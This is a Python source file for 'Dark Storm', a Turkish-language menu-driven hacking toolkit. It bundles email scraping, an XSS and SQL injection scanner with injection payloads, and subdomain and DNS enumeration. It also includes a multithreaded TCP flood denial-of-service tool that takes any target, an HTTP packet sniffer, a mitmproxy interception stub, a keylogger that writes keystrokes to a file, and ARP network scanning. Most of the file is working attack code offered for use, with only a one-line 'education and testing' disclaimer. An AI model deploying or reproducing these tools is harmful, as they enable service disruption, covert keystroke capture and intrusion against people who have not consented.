from pynput import keyboard
from bs4 import BeautifulSoup
from scapy.all import ARP, Ether, srp
from urllib.parse import urljoin
from scapy.all import sniff, Raw, IP
from mitmproxy import http
import threading
import dns.resolver
import re
import socket
import os
import sys
import time
import requests

# Renkler:
RED = "\033[31m"
BLUE = "\033[34m"
GREEN = "\033[32m"
PURPLE = "\033[35m"
BLACK =  "\033[30m"
WHITE = "\033[37m"
YELLOW = "\033[33m"
BORDO = "\033[38;5;130m"
DARKGREEN = "\033[38;5;28m"

__version__ = 1.0

def intros1(intro1, delay=0.1):
    for char in intro1:
       sys.stdout.write(char);
       sys.stdout.flush()
       time.sleep(delay)
    print()

intro1 = f"            {GREEN}       --- Hoş geldiniz ---    "
intros1(intro1)

def intros2(intro2, delay=0.1):
    for char in intro2:
       sys.stdout.write(char);
       sys.stdout.flush()
       time.sleep(delay)
    print()

intro2 = f"              {BLUE}    - Dark Storm Açılıyor -    "
intros2(intro2)
time.sleep(1.8)
os.system("clear")

                                # Proje - 2: Dark Storm
banner = f""" 
{WHITE}            _____             _        ______ _                         
{WHITE}           |  _  \  __,_ _,__| | __   / ____ | |_ ____  _,__ _,__,___   
{WHITE}           | | |  |/ _  |  __| |/ /   \____ \| __/    \|  __|  _   _ \  
{WHITE}           | |_|  | (_| | |  |   <    _____) | ||  ()  | |  | | | | | | 
{WHITE}           |_____/ \__,_|_|  | |\_\  |______/ \__\____/|_|  |_| |_| |_|
{BLUE}          ----------------------------------------------------------------
{BLUE}          ----------------------------------------------------------------
                {YELLOW}By: github.com/ZCTools /\ {RED}Instagram: @zer0crypt0       
{BLUE}          ----------------------------------------------------------------
{BLUE}          ----------------------------------------------------------------
                                   Version: {GREEN}{__version__}
                     [1]: {RED}WEB OSINT            [2]: {RED}DoS Attack
                     [3]: {RED}HTTP Sniffing        [4]: {RED}HTTPS Sniffing 
                     [5]: {RED}Keylogger            [6]: {RED}Ağ Analizi
                     [7]: {BORDO}.bat Files           {RED}[0]: EXIT     
"""
print(banner)

choice = int(input("Lütfen bir şeçenek seçiniz: "))

# 1.Seçenek:
if choice == 1:
    print(f"{DARKGREEN}10): Email OSINT(WEB sitesinde Email Tarayıcısı)")
    print(f"{RED}20): XSS and SQL Zafiyet Tarayıcısı")
    print(f"{DARKGREEN}30): Subdomain Finder")
    print(f"{DARKGREEN}40): DNS Dumpster")
    choice2 = int(input("Bir OSINT Seçeneği Seçiniz: "))

    # Email OSINT:
    if choice2 == 10:
        def find_emails(starting_text, url):
            try:
                response = requests.get(url)
                response.raise_for_status()
            except requests.exceptions.RequestException as e:
                print(f"[-] ER0R: URL Yakalanırken Bir Sorun Oluştu {e}")
                return []
            
            page_content = response.text
            emails = re.findall(r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,7}\b', page_content)
            filtered_emails = [email for email in emails if email.startswith(starting_text)]
            return filtered_emails

        def main():
            starting_text = input("Email'ler için bir Başlangıç Metni Giriniz: ")
            url = input("Taranacak URL'yi Giriniz: ")
            emails = find_emails(starting_text, url)
            if emails:
                print("[+] Email'ler Bulundu:")
                for email in emails:
                    print(email)
            else:
                print("[-] Verilen Metinle Başlayan Email Bulunamadı.")

        if __name__ == "__main__":
            main()

    # XSS ve SQL Zafiyet Tarayıcısı
    elif choice2 == 20:
        def scan_xss(url): # XSS Zafiyet Tarayıcısı
            xss_payload = "<script>alert('XSS Açığı X_X')</script>"
            response = requests.get(url)
            forms = BeautifulSoup(response.text, 'html.parser').find_all('form')

            for form in forms:
                action = form.get('action')
                post_url = urljoin(url, action)
                method = form.get('method')
                
                input_fields = form.find_all('input')
                data = {}
                for input_field in input_fields:
                    name = input_field.get('name')
                    if name:
                        data[name] = xss_payload

                if method.lower() == 'post':
                    response = requests.post(post_url, data=data)
                else:
                    response = requests.get(post_url, params=data)
                    
                if xss_payload in response.text:
                    print(f"[+] XSS Zafiyeti/Açığı Bulundu: {post_url}")
                else:
                    print(f"[-] XSS Zafiyeti/Açığı Bulunmadı {post_url}")

# SQL Injection Zafiyet Tarayıcısı:
        def scan_sql_injection(url):
            sql_payloads = ["' OR '1'='1", "' OR '1'='1' -- ", '" OR "1"="1"', "' OR '1'='1' /*"]
            for payload in sql_payloads:
                response = requests.get(f"{url}?id={payload}")
                if "SQL" in response.text or "sql" in response.text:
                    print(f"[+] Payload ile SQL Zafiyeti/Açığı Bulundu: {payload}")
                else:
                    print(f"[-] Payload ile SQL Zafiyeti/Açığı Bulunmadı: {payload}")

        def main():
            url = input("Taranacak URL'yi Giriniz: ")
            print("\nXSS Zafiyeti/Açığı Taranıyor...")
            scan_xss(url)
            print("\nSQL Infection Zafiyeti/Açığı Taranıyor...")
            scan_sql_injection(url)
        if __name__ == "__main__":
            main()
            
    # Subdomain Finder
    elif choice2 == 30:
        def find_subdomains(domain, wordlist):
            found_subdomains = []
            for word in wordlist:
                subdomain = f"http://{word}.{domain}"
                try:
                    response = requests.get(subdomain)
                    if response.status_code == 200:
                        print(f"Found: {subdomain}")
                        found_subdomains.append(subdomain)
                except requests.ConnectionError:
                    pass
            return found_subdomains
        
        def main():
            domain = input("Taranacak bir Domain Giriniz: (e.g., örnek.com): ")
            wordlist = ['www', 'mail', 'ftp', 'test', 'dev']  # Örnek kelime listesi
            
            found_subdomains = find_subdomains(domain, wordlist)
            if found_subdomains:
                print("\n[+] Sobdomain'ler Bulundu:")
                for subdomain in found_subdomains:
                    print(subdomain)
                else:
                    print("[-] Sobdomain Bulunamadı.")
        if __name__ == "__main__":
            main()
    
    elif choice2 == 40: # DNS Dumpster
        def get_dns_records(domain):
            records = {}
            try:
                records['A'] = [str(rdata) for rdata in dns.resolver.resolve(domain, 'A')]
            except dns.resolver.NoAnswer:
                records['A'] = []

            try:
                records['AAAA'] = [str(rdata) for rdata in dns.resolver.resolve(domain, 'AAAA')]
            except dns.resolver.NoAnswer:
                records['AAAA'] = []

            try:
                records['MX'] = [str(rdata.exchange) for rdata in dns.resolver.resolve(domain, 'MX')]
            except dns.resolver.NoAnswer:
                records['MX'] = []

            try:
                records['NS'] = [str(rdata) for rdata in dns.resolver.resolve(domain, 'NS')]
            except dns.resolver.NoAnswer:
                records['NS'] = []

            try:
                records['TXT'] = [str(rdata) for rdata in dns.resolver.resolve(domain, 'TXT')]
            except dns.resolver.NoAnswer:
                records['TXT'] = []

            return records

        def find_subdomains(domain, wordlist):
            subdomains = []
            for word in wordlist:
                subdomain = f"{word}.{domain}"
                try:
                    dns.resolver.resolve(subdomain, 'A')
                    subdomains.append(subdomain)
                except (dns.resolver.NoAnswer, dns.resolver.NXDOMAIN):
                    continue
            return subdomains

        def main():
            domain = input("Bir Domain Giriniz: ")

            # DNS records    
            print(f"DNS Kayıtları Yakalanıyor {domain}...")
            records = get_dns_records(domain)
            for record_type, rdata in records.items():
                print(f"{record_type}[+] Kayıtlar:")
                for entry in rdata:
                    print(f"  {entry}")
    
            # Subdomain enumeration
            wordlist = ['www', 'mail', 'ftp', 'test', 'dev']  # örnek kelime listesi
            print(f"\n[+] Subdomain'ler Bulundu {domain}...")
            subdomains = find_subdomains(domain, wordlist)
            if subdomains:
                print("Bulunan Subdomain'ler:")
                for subdomain in subdomains:
                    print(f"  {subdomain}")
            else:
                print("[-] Subdomain'ler Bulunamadı.")

        if __name__ == "__main__":
            main()

# DoS:
elif choice == 2:
    print("--- Welcome ---") 
    print("-- X_X Are U Ready Explosion X_X --")
    print("Github: ZCTools")
    print("Instagram: zer0crypt0")
    print("{-- By: Zer0-Ctypt0 --}")
    time.sleep(2)
    os.system("clear")
    
    target_Host = str(input("Please enter target Web site or IP: "))
    data = os.urandom(1024)  # Rastgele 1024 bayt veri oluşturma
    connection_Time = int(input("Please Enter Connection(s): "))
    threads_Number = int(input("Please Enter Threads Number: "))
    target_IP_Address = socket.gethostbyname(target_Host)
    target_Port_Number = int(input("Please Enter Target Port Number(Default -> 80): "))

    print("---------------------------------------------------")
    print("Checking IP Address and Port number...")
    print(f" [{{{target_IP_Address}}}] ")
    print(f" [{{{target_Port_Number}}}] ")
    print(f" {{[Attacking: {target_Host} Please Wait...]}} ")
    print("---------------------------------------------------")
    
    def start_Ddos():
        while True:
            ddos_Attack = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            try:
                ddos_Attack.connect((target_IP_Address, target_Port_Number))  # Connection Target Host
                ddos_Attack.send(data)
                for _ in range(connection_Time):
                    ddos_Attack.send(data)
            except Exception as e:
                print(f"Error: {e}")
            finally:
                ddos_Attack.close()

    for _ in range(threads_Number):
        th = threading.Thread(target=start_Ddos)
        th.start()

# HTTP Sniffing:
elif choice == 3:
    # Hedef IP adresi veya network arayüzü
    target_ip = "192.168.1.1/24"  # Tüm yerel ağ için
    interface = "wlan0"  # Değiştirmeniz gerekebilir
    
    def packet_callback(packet):
        if packet.haslayer(Raw):
            payload = packet[Raw].load
            if packet.haslayer(IP):  # IP katmanını kontrol edin
                src_ip = packet[IP].src
                dst_ip = packet[IP].dst
                
                # HTTP isteğini yakala
                if b"GET" in payload or b"POST" in payload:
                    try:
                        # HTTP Host bilgisini ayıklama
                        host = re.search(b"Sunucu: (.*?)\r\n", payload).group(1).decode('utf-8')
                        path = re.search(b"(GET|POST) (.*?) HTTP/1.", payload).group(2).decode('utf-8')
                        print(f"[{src_ip}] -> [{dst_ip}]: http://{host}{path}")
                    except Exception as e:
                        print(f"ER0R: paketler ayrıştırılırken bir hata çıktı:( {e}")

    if __name__ == "__main__":
        print("[*] HTTP Sniffer başlatılıyor...")
        try:
            sniff(filter="tcp port 80", prn=packet_callback, iface=interface, store=0)
        except KeyboardInterrupt:
            print("\n[-] Sniffer durduruldu.")
        except Exception as e:
            print(f"ER0R: Sniffer çalıştırılırken bir hata çıktı: {e}")

# HTTPS Sniffing:
elif choice == 4:
    print(f"{BORDO} Lütfen mitmdump -s 'senin_kodun.py' diye çalıştırın.")
    def request(flow: http.HTTPFlow) -> None:
        # Istekleri yakala ve bilgileri göster
        print(f"Istekler(Requests): {flow.request.url}")
        print(f"Başlıklar(Headers): {flow.request.headers}")

    def response(flow: http.HTTPFlow) -> None:
        # Yanıtları yakala ve bilgileri göster
        print(f"Cevap(Response): {flow.request.url}")
        print(f"Durum kodu: {flow.response.status_code}")
        print(f"Bağlantı: {flow.response.text[:200]}")  # Ilk 200 karakteri göster

# Keylogger:
elif choice == 5:
    log_file = "keylog.txt"
    
    def on_press(key):
        try:
            with open(log_file, "a") as file:
                file.write(f"Basılan Tuş: {key.char}\n")
        except AttributeError:
            with open(log_file, "a") as file:
                if key == keyboard.Key.space:
                    file.write("Basılan Tuş: [SPACE]\n")
                elif key == keyboard.Key.enter:
                    file.write("Basılan Tuş: [ENTER]\n")
                elif key == keyboard.Key.tab:
                    file.write("Basılan Tuş: [TAB]\n")
                else:
                    file.write(f"Basılan Tuş: {key}\n")

    def on_release(key):
        if key == keyboard.Key.esc:
            return False

                        # CTRL+C Basınca Program Kapansın
    try:
        with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()
    except KeyboardInterrupt:
        print("\nKeylogger Durduruldu.")

# Ağ Analizi
elif choice == 6:
    def scan_network(ip_range):
        # ARP request paketi oluştur
        arp_request = ARP(pdst=ip_range)
        # Ethernet frame paketi oluştur
        ether = Ether(dst="ff:ff:ff:ff:ff:ff")
        # ARP request'i Ethernet frame ile birleştir
        packet = ether / arp_request
        
        # Paketi gönder ve yanıtları al
        result = srp(packet, timeout=2, verbose=0)[0]

        # Yanıtları işleyerek cihazların bilgilerini al
        devices = []
        for sent, received in result:
            devices.append({
                "IP Address": received.psrc,
                "MAC Address": received.hwsrc,
                "Hostname": get_hostname(received.psrc)
            })

        return devices

    def get_hostname(ip):
        try:
            hostname = socket.gethostbyaddr(ip)[0]
        except:
            hostname = "Unknown"
        return hostname

    if __name__ == "__main__":
        # Taranacak IP aralığını belirleyin
        ip_range = "192.168.1.1/24"  # Ağınıza uygun şekilde değiştirin
        
        devices = scan_network(ip_range)
    
        # Tablonun başlıklarını yazdır
        print("Cihaz Listesi:\n")

        # Her cihaz için bilgileri yazdır
        for i, device in enumerate(devices, 1):
            print(f"{i}. Cihaz:")
            print(f"  Ad: {device['Hostname']}")
            print(f"  IP Adresi: {device['IP Address']}")
            print(f"  MAC Adresi: {device['MAC Address']}\n")

# .bat uzantılı Zararlı ve Tehlikeli Windows Komutları
elif choice == 7:
    print(f"{RED} For_Windows Klasöründeki .bat dosyalarını incele!")
    print(f"{BORDO} Sadece eğitim ve test için kullan!")

# EXIT:
elif choice == 0:
    print("Iyi Günler...")
    sys.exit(0)




    